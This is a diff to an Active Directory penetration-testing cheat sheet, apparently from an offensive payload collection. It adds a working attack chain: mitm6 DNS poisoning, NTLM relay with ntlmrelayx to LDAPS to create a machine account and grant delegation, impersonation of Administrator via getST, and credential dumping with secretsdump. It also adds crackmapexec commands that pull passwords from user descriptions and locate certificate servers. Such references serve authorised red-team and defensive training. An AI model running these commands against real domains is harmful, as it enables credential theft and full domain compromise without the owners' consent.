@@ -67,7 +67,7 @@
       - [Drop the MIC](#drop-the-mic)
       - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
       - [RemotePotato0 DCOM DCE RPC relay](#remotepotato0-dcom-dce-rpc-relay)
-      - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
+      - [DNS Poisonning - Relay delegation with mitm6](#dns-poisonning---relay-delegation-with-mitm6)
     - [Active Directory Certificate Services](#active-directory-certificate-services)
       - [ESC1 - Misconfigured Certificate Templates](#esc1---misconfigured-certificate-templates)
       - [ESC2 - Misconfigured Certificate Templates](#esc2---misconfigured-certificate-templates)
@@ -1216,6 +1216,7 @@ LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastS
 ### Password in AD User comment
 
 ```powershell
+$ crackmapexec ldap domain.lab -u 'username' -p 'password' -M user-desc
 $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M get-desc-users
 GET-DESC... 10.0.2.11       389    dc01    [+] Found following users: 
 GET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in account for guest access to the computer/domain
@@ -1928,7 +1929,7 @@ Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
 ```
 
 
-#### Relay delegation with mitm6
+#### DNS Poisonning - Relay delegation with mitm6
 
 Requirements: 
 - IPv6 enabled (Windows prefers IPV6 over IPv4)
@@ -1942,12 +1943,27 @@ cd /opt/tools/mitm6
 pip install .
 
 mitm6 -hw ws02 -d lab.local --ignore-nofqnd
+# -d: the domain name that we filter our request on (the attacked domain)
+# -i: the interface we have mitm6 listen on for events
+# -hw: host whitelist
+
+ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad
+ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer
+# -ip: the interface you want the relay to run on
+# -wh: WPAD host, specifying your wpad file to serve
+# -t: the target where you want to relay to
+
+# now granting delegation rights and then do a RBCD
 ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
-then use rubeus with s4u to relay the delegation
+getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administrator  
+export KRB5CCNAME=administrator.ccache  
+secretsdump.py -k -no-pass target.lab.local  
 ```
 
 
 ### Active Directory Certificate Services
+
+Find ADCS Server : `crackmapexec ldap domain.lab -u username -p password -M adcs`
 
 #### ESC1 - Misconfigured Certificate Templates
 
